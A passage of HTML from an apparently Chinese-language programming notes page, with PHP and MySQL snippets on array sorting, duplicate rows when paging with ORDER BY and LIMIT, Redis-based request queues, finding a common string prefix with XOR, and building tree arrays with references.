class="string">'age'</span>,<span class="string">'asc'</span>); <span class="comment">// 或者$a = array_orderby($a,'age','asc');</span></span><br><span class="line">$b = array(</span><br><span class="line">  array(</span><br><span class="line">    <span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'count'</span> =&gt; <span class="number">36</span>,</span><br><span class="line">    <span class="string">'children'</span> =&gt; array(</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">76</span>,<span class="string">'count'</span> =&gt; <span class="number">40</span>),</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">98</span>,<span class="string">'count'</span> =&gt; <span class="number">100</span>)</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">19</span>,<span class="string">'count'</span> =&gt; <span class="number">87</span>),</span><br><span class="line">  ......</span><br><span class="line">);</span><br><span class="line">array_orderby($b,<span class="string">'count'</span>,<span class="string">'desc'</span>,<span class="string">'children'</span>);</span><br><span class="line">https:<span class="comment">//www.tangshuang.net/2077.html</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-orderby-limit-翻页数据重复"><a href="#mysql-orderby-limit-翻页数据重复" class="headerlink" title="mysql orderby limit 翻页数据重复"></a>mysql orderby limit 翻页数据重复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">使用上述SQL查询的时候，很有可能出现和LIMIT <span class="number">0</span>,<span class="number">5</span>相同的某条记录，而如果使用：</span><br><span class="line"></span><br><span class="line">SELECT * FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">则不会出现重复的情况。但是，由于post表的字段很多，我仅仅希望用这两个字段，不想把post_content也查出来。为了解决这个情况，我在ORDER BY后面使用了两个排序条件来解决这个问题。</span><br><span class="line"></span><br><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc,ID asc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">按理来说，mysql的排序默认情况下是以主键ID作为排序条件的，也就是说，如果在view_count相等的情况下，主键ID作为默认的排序条件，不需要我们多此一举加ID asc。但是事实就是，mysql再order by和limit混用的时候，出现了排序的混乱情况。其后的机理我尚不得而知，在阅读这篇文章后，好像有所领悟，下面做一下猜测。</span><br><span class="line"></span><br><span class="line">这篇文章的解释是：https:<span class="comment">//www.tangshuang.net/1827.html</span></span><br><span class="line"></span><br><span class="line">在MySQL <span class="number">5.6</span>的版本上，优化器在遇到order by limit语句的时候，做了一个优化，即使用了priority queue。……</span><br><span class="line"></span><br><span class="line">使用 priority queue 的目的，就是在不能使用索引有序性的时候，如果要排序，并且使用了limit n，那么只需要在排序的过程中，保留n条记录即可，这样虽然不能解决所有记录都需要排序的开销，但是只需要 sort buffer 少量的内存就可以完成排序。</span><br><span class="line"></span><br><span class="line">之所以<span class="number">5.6</span>出现了第二页数据重复的问题，是因为 priority queue 使用了堆排序的排序方法，而堆排序是一个不稳定的排序方法，也就是相同的值可能排序出来的结果和读出来的数据顺序不一致。</span><br><span class="line"></span><br><span class="line"><span class="number">5.5</span> 没有这个优化，所以也就不会出现这个问题。</span><br><span class="line">也就是说，mysql5<span class="number">.5</span>是不存在本文提到的问题的，<span class="number">5.6</span>版本之后才出现了这种情况。</span><br><span class="line"></span><br><span class="line">我们再看下mysql解释sql语言时的执行顺序：</span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>) SELECT </span><br><span class="line">(<span class="number">8</span>) DISTINCT &lt;select_list&gt;</span><br><span class="line">(<span class="number">1</span>) FROM &lt;left_table&gt;</span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; JOIN &lt;right_table&gt;</span><br><span class="line">(<span class="number">2</span>) ON &lt;join_condition&gt;</span><br><span class="line">(<span class="number">4</span>) WHERE &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) GROUP BY &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) HAVING &lt;having_condition&gt;</span><br><span class="line">(<span class="number">9</span>) ORDER BY &lt;order_by_condition&gt;</span><br><span class="line">(<span class="number">10</span>) LIMIT &lt;limit_number&gt;</span><br><span class="line">在我们本文的案例sql中，执行顺序依次为form... where... select... order by... limit...</span><br><span class="line"></span><br><span class="line">由于上述priority queue的原因，在完成select之后，所有记录是以堆排序的方法排列的，在进行order by时，仅把view_count值大的往前移动。但由于limit的因素，排序过程中只需要保留到<span class="number">5</span>条记录即可，view_count并不具备索引有序性，所以当第二页数据要展示时，mysql见到哪一条就拿哪一条，因此，当排序值相同的时候，第一次排序是随意排的，第二次再执行该sql的时候，其结果应该和第一次结果一样。</span><br></pre></td></tr></table></figure>
<h3 id="消息队列处理高并发"><a href="#消息队列处理高并发" class="headerlink" title="消息队列处理高并发"></a>消息队列处理高并发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">当用户点击按钮提交购买请求时，并不直接马上执行购买请求动作，而是将请求动作存入消息列队，用户的请求到此结束，而在服务器后台，从消息列队中逐一取出请求记录，再进行数据库操作，完成处理之后，将处理结果返回给用户。由于消息队列的存取是先进先出（和栈相反），因此，所有处理将按请求顺序进行处理。由于处理是在后台一个一个完成，因此不会对服务器和数据库造成巨大压力。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $redis-&gt;LPUSH(<span class="string">'click'</span>,$user_id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">  echo $e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;pconnect(<span class="string">'127.0.0.1'</span>,<span class="number">6379</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    $value = $redis-&gt;LPOP(<span class="string">'click'</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      利用$value进行逻辑和数据处理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(Exception $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取这两个字符串前面的相同部分"><a href="#获取这两个字符串前面的相同部分" class="headerlink" title="获取这两个字符串前面的相同部分"></a>获取这两个字符串前面的相同部分</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">异或运算是一种非常特殊的运算，简单的说就是“如果两个值相同，返回<span class="number">0</span>|<span class="literal">false</span>，如果两个值不同，则返回<span class="number">1</span>|<span class="literal">true</span>”。</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">samestrin</span>(<span class="params">$str1, $str2</span>) </span>&#123;</span><br><span class="line">  $pos = strspn($str1 ^ $str2, <span class="string">"\0"</span>);</span><br><span class="line">  <span class="keyword">if</span>($pos) &#123;</span><br><span class="line">    <span class="keyword">return</span> substr($str1, <span class="number">0</span>, $pos);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;https:<span class="comment">//www.tangshuang.net/82.html</span></span><br><span class="line">上述代码中，关键部分已经用红色表示出来了。一般情况下，当你对两个字符串进行异或操作的时候，相同的字符的异或结果是<span class="literal">null</span>(“\<span class="number">0</span>”)，所以我们只要找出第一个非<span class="literal">null</span>(“\<span class="number">0</span>”)字符就可以了。如此优雅的操作，得益于计算机领域的异或运算，如若没有这种算法，我们可能需要写一大堆代码来进行匹配对比。</span><br><span class="line"> samestrin(<span class="string">'ab'</span>,<span class="string">'abd'</span>)</span><br><span class="line">=&gt; <span class="string">"ab"</span></span><br></pre></td></tr></table></figure>
<h3 id="树形结构算法"><a href="#树形结构算法" class="headerlink" title="树形结构算法"></a>树形结构算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 构建层级（树状）数组</span></span><br><span class="line"><span class="comment"> * @param array $array 要进行处理的一维数组，经过该函数处理后，该数组自动转为树状数组</span></span><br><span class="line"><span class="comment"> * @param string $pid 父级ID的字段名</span></span><br><span class="line"><span class="comment"> * @return array|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">&amp;$array, $pid = <span class="string">'pid'</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 子元素计数器</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_children_count</span>(<span class="params">$array,$pid</span>) </span>&#123;</span><br><span class="line">    $counter = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      $count = isset($counter[$item[$pid]]) ? $counter[$item[$pid]] : <span class="number">0</span>;</span><br><span class="line">      $count ++;</span><br><span class="line">      $counter[$item[$pid]] = $count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $counter;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把元素插入到对应的父元素children字段</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_child_append</span>(<span class="params">$parent,$pid,$child</span>) </span>&#123;</span><br><span class="line">    foreach($parent <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'id'</span>] == $pid) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset($item[<span class="string">'children'</span>])) $item[<span class="string">'children'</span>] = array();</span><br><span class="line">        $item[<span class="string">'children'</span>][] = $child;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $parent;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 开始程序</span></span><br><span class="line">  $counter = array_children_count($array,$pid);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果顶级元素为0个，那么直接返回false</span></span><br><span class="line">  <span class="keyword">if</span>($counter[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 准备顶级元素</span></span><br><span class="line">  $tree = array();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 位移</span></span><br><span class="line">  <span class="keyword">while</span>(isset($counter[<span class="number">0</span>]) &amp;&amp; $counter[<span class="number">0</span>] &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果顶级栏目的子元素计数器仍然大于0，那么仍然往下执行循环</span></span><br><span class="line">    $temp = array_shift($array);</span><br><span class="line">    <span class="keyword">if</span>(isset($counter[$temp[<span class="string">'id'</span>]]) &amp;&amp; $counter[$temp[<span class="string">'id'</span>]] &gt; <span class="number">0</span>) &#123; <span class="comment">// 如果数组的第一个元素的子元素个数大于0，那么把该元素放置到数组的末端</span></span><br><span class="line">      array_push($array,$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// 相反，如果该数组的第一个元素没有子元素，那么把该元素移动到其父元素的children字段中，同时，该元素从原数组中被删除</span></span><br><span class="line">      <span class="keyword">if</span>($temp[$pid] == <span class="number">0</span>)</span><br><span class="line">        $tree[] = $temp;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        $array = array_child_append($array,$temp[$pid],$temp);</span><br><span class="line">    &#125;</span><br><span class="line">    $counter = array_children_count($array,$pid);</span><br><span class="line">  &#125;</span><br><span class="line">  $array = $tree;</span><br><span class="line">  <span class="keyword">return</span> $tree;</span><br><span class="line">&#125;</span><br><span class="line">$arr = array(</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">53</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">64</span>,<span class="string">'pid'</span> =&gt; <span class="number">53</span>),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">70</span>,<span class="string">'pid'</span> =&gt; <span class="number">42</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">//$r=array_tree($arr,'pid');print_r($r);</span></span><br><span class="line"></span><br><span class="line">$demo1 = array(</span><br><span class="line">  <span class="number">1</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">1</span>,<span class="string">'title'</span> =&gt; <span class="string">'title1'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>),</span><br><span class="line">  <span class="number">2</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">2</span>,<span class="string">'title'</span> =&gt; <span class="string">'title2'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">3</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">3</span>,<span class="string">'title'</span> =&gt; <span class="string">'title3'</span>,<span class="string">'pid'</span> =&gt; <span class="number">1</span>),</span><br><span class="line">  <span class="number">4</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">4</span>,<span class="string">'title'</span> =&gt; <span class="string">'title4'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">5</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">5</span>,<span class="string">'title'</span> =&gt; <span class="string">'title5'</span>,<span class="string">'pid'</span> =&gt; <span class="number">2</span>),</span><br><span class="line">  <span class="number">6</span> =&gt; array(<span class="string">'id'</span> =&gt; <span class="number">6</span>,<span class="string">'title'</span> =&gt; <span class="string">'title6'</span>,<span class="string">'pid'</span> =&gt; <span class="number">0</span>)</span><br><span class="line">);</span><br><span class="line">$demo1 = array_tree($demo1);<span class="comment">// 或者直接使用array_tree($demo1);，无需返回值https://www.tangshuang.net/2073.html https://3v4l.org/kngT8</span></span><br><span class="line">print_r($demo1);</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Nance</span><br><span class="line">            [age] =&gt; <span class="number">21</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; Kenvi</span><br><span class="line">            [age] =&gt; <span class="number">18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">6</span></span><br><span class="line">            [title] =&gt; title6</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [id] =&gt; <span class="number">1</span></span><br><span class="line">            [title] =&gt; title1</span><br><span class="line">            [pid] =&gt; <span class="number">0</span></span><br><span class="line">            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                (</span><br><span class="line">                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">3</span></span><br><span class="line">                            [title] =&gt; title3</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                        (</span><br><span class="line">                            [id] =&gt; <span class="number">2</span></span><br><span class="line">                            [title] =&gt; title2</span><br><span class="line">                            [pid] =&gt; <span class="number">1</span></span><br><span class="line">                            [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                (</span><br><span class="line">                                    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">4</span></span><br><span class="line">                                            [title] =&gt; title4</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">                                        )</span><br><span class="line"></span><br><span class="line">                                    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                        (</span><br><span class="line">                                            [id] =&gt; <span class="number">5</span></span><br><span class="line">                                            [title] =&gt; title5</span><br><span class="line">                                            [pid] =&gt; <span class="number">2</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">array_tree</span>(<span class="params">$array</span>) </span>&#123;</span><br><span class="line">    $result = array();</span><br><span class="line">    $tmp = array();</span><br><span class="line">    foreach($array <span class="keyword">as</span> $item) &#123;</span><br><span class="line">      <span class="keyword">if</span>($item[<span class="string">'parent_id'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">        $i = count($result);</span><br><span class="line">        $result[$i] = $item;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $tmp[$id] = &amp;$result[$i];<span class="comment">//这一句保证了当无论$tmp[$id]还是$result[$i]发生变化，都会让另外一个值同时发生变化。而 $tmp[$parent_id]['children'][$i] = $item; 实际上导致$result[$parent_id]发生了变化。</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = $item[<span class="string">'id'</span>];</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        $parent = $tmp[$parent_id];</span><br><span class="line">        $i = count($parent[<span class="string">'children'</span>]);</span><br><span class="line">        $tmp[$parent_id][<span class="string">'children'</span>][$i] = $item;</span><br><span class="line">        $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">  &#125;</span><br><span class="line">  当$b = &amp;$a时，$b和$a同时引用同一个内容（指针指向同一块内存），无论$a或$b谁发生变化，这个内容都会发生变化，进而呈现为$a和$b保持同步的变化。</span><br><span class="line">  https:<span class="comment">//www.tangshuang.net/1701.html</span></span><br><span class="line">  print_r(array_tree($demo1));</span><br><span class="line">    <span class="built_in">Array</span></span><br><span class="line">    (</span><br><span class="line">        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">1</span></span><br><span class="line">                [title] =&gt; title1</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                    (</span><br><span class="line">                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">2</span></span><br><span class="line">                                [title] =&gt; title2</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                                [children] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                    (</span><br><span class="line">                                        [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">4</span></span><br><span class="line">                                                [title] =&gt; title4</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                                            (</span><br><span class="line">                                                [id] =&gt; <span class="number">5</span></span><br><span class="line">                                                [title] =&gt; title5</span><br><span class="line">                                                [parent_id] =&gt; <span class="number">2</span></span><br><span class="line">                                            )</span><br><span class="line">    </span><br><span class="line">                                    )</span><br><span class="line">    </span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">                            (</span><br><span class="line">                                [id] =&gt; <span class="number">3</span></span><br><span class="line">                                [title] =&gt; title3</span><br><span class="line">                                [parent_id] =&gt; <span class="number">1</span></span><br><span class="line">                            )</span><br><span class="line">    </span><br><span class="line">                    )</span><br><span class="line">    </span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">        [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">            (</span><br><span class="line">                [id] =&gt; <span class="number">6</span></span><br><span class="line">                [title] =&gt; title6</span><br><span class="line">                [parent_id] =&gt; <span class="number">0</span></span><br><span class="line">            )</span><br><span class="line">    </span><br><span class="line">    )</span><br><span class="line">    $tmp[$id] = &amp;$tmp[$parent_id][<span class="string">'children'</span>][$i];这一句起到了关键性作用。加上这一句之后，我们再来跑一遍array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)这个元素。</span><br><span class="line">    </span><br><span class="line">    [<span class="number">2</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...)  <span class="comment">// 重新从①开始演示</span></span><br><span class="line">    </span><br><span class="line">    $result[<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">5</span>,...) <span class="comment">// 内部结果</span></span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>] = &amp;$tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>]  <span class="comment">// 第二个&amp;出现了</span></span><br><span class="line">    </span><br><span class="line">    [<span class="number">5</span>]=&gt; array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">12</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> =&gt; <span class="number">12</span>,...)</span><br><span class="line">    </span><br><span class="line">    由于第二个&amp;引用的原因，实际上发生了：</span><br><span class="line">    </span><br><span class="line">    $tmp[<span class="number">5</span>][<span class="string">'children'</span>][<span class="number">0</span>][<span class="string">'children'</span>][<span class="number">0</span>] = array(<span class="string">'id'</span> =&gt; <span class="number">23</span>,<span class="string">'parent_id'</span> 